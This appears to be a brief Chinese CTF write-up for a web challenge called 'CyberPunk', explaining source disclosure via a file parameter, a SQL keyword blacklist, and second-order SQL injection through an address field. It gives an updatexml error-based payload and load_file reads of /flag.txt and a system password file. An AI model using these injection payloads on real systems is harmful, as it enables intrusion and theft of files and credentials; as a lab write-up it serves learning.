---
title: CyberPunk
date: 2021-04-04 14:54:09
tags: wp

---
## '__'   

![](https://ftp.bmp.ovh/imgs/2021/04/e4c5412ad0e75377.png) 
看下源码，有提示：`<!--?file=?-->`     

用伪协议读下文件      
`index.php`      
`change.php`     
`config.php`      
`search.php`     
`delete.php`        

`$pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';`         
name和phone 都过滤了好多          
address只有一个addslashes转义函数        
修改地址那里没有过滤，可以在此进行SQL注入，第一次修改为SQL语句，再次修改，刚才修改的SQL语句就被查询执行了          
回显只有`订单修改成功`       
可以报错注入        
payload：`1' where user_id=updatexml(1,concat(0x7e,(select user()),0x7e),1)#`       
不过这道题flag没在数据库中，要用`load_file`读取文件     
`select load_file('/flag.txt')`     
`flag.txt`是猜的       
updatexml每次只能回显32位     
可以substr或者right、left       

![](https://ftp.bmp.ovh/imgs/2021/04/167b92bcd92a0069.png) 


## 芝士·      

`select load_file('/etc/password')`    
